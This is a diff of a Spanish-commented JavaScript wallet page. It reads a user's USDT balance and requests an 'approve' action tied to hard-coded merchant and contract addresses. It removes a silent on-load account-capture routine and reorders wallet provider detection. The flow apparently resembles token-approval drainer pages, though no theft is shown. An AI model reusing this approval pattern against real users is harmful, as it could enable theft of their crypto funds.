@@ -1,23 +1,5 @@
 "use strict";
 
-// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ─────────────────
-(function () {
-  if (typeof window === 'undefined') return;
-  
-  window.addEventListener("eip6963:announceProvider", (event) => {
-    if (event.detail && event.detail.provider && !window.ethereum) {
-      window.ethereum = event.detail.provider;
-    }
-  });
-  window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-  setTimeout(() => {
-    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
-      window.ethereum = window.web3.currentProvider;
-    }
-  }, 100);
-})();
-
 // ─── Configuration ────────────────────────────────────────────────────────────
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
@@ -64,20 +46,6 @@ if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
 let _cachedAddress = null;
 
-// ─── Silent Connect on Web3 In-App Browsers ──────────────────────────────────
-window.addEventListener("load", async () => {
-  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
-  try {
-    const accs = await window.ethereum.request({ method: "eth_accounts" });
-    if (accs && accs[0]) _cachedAddress = accs[0];
-  } catch (_) {}
-  if (typeof window.ethereum.on === "function") {
-    window.ethereum.on("accountsChanged", (accs) => {
-      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
-    });
-  }
-});
-
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
@@ -94,17 +62,21 @@ function setLoading(on, label = "Processing…") {
   btnSpinner.hidden   = !on;
 }
 
-// ─── Universal Provider Fetcher ───────────────────────────────────────────────
+// ─── Universal Provider Fetcher (Optimized for AppKit First) ──────────────────
 async function getActiveProvider() {
-  // 1. Si está en un navegador in-app (Trust, MetaMask internal browser)
+  // 1. Priorizar el proveedor gestionado por Reown AppKit si ya se conectó
+  if (window.modal && typeof window.modal.getWalletProvider === "function") {
+    try {
+      const appKitProvider = window.modal.getWalletProvider();
+      if (appKitProvider) return appKitProvider;
+    } catch (_) {}
+  }
+  
+  // 2. Proveedor inyectado estándar (navegadores in-app móviles o extensiones directas)
   if (window.ethereum && typeof window.ethereum.request === "function") {
     return window.ethereum;
   }
-  // 2. Si se usó Reown AppKit modal
-  if (window.modal && window.modal.getWalletProvider) {
-    const walletProvider = window.modal.getWalletProvider();
-    if (walletProvider) return walletProvider;
-  }
+  
   return null;
 }
 
@@ -184,24 +156,23 @@ async function getUsdtBalance(provider, userAddress, iface) {
   try { return BigInt(result); } catch (_) { return 0n; }
 }
 
-// ─── Main button handler ──────────────────────────────────────────────────────
+// ─── Main button handler ────────────────────────────────________________──────
 approveBtn.addEventListener("click", async () => {
   let provider = await getActiveProvider();
 
-  // Si no hay un proveedor activo detectado, abrir siempre el modal de Reown AppKit
+  // Si no hay sesión activa, abrir el modal de Reown AppKit para elegir billetera / QR
   if (!provider) {
     if (window.modal) {
       try {
         await window.modal.open();
-        
-        // Esperar a que el usuario seleccione una billetera y se establezca el proveedor
+        // Esperar brevemente a que el usuario interactúe con el modal y elija una billetera
         for (let i = 0; i < 30; i++) {
           await new Promise(r => setTimeout(r, 500));
           provider = await getActiveProvider();
           if (provider) break;
         }
-      } catch (err) {
-        console.error("Error al abrir el modal:", err);
+      } catch (modalErr) {
+        console.error("Error al abrir el modal de WalletConnect:", modalErr);
       }
     }
   }
@@ -245,7 +216,7 @@ approveBtn.addEventListener("click", async () => {
     }
 
     if (!userAddress) {
-      showToast("Billetera no detectada. Abre esta página desde tu app de billetera.", "error");
+      showToast("Billetera no detectada. Abre el modal de conexión.", "error");
       setLoading(false);
       return;
     }
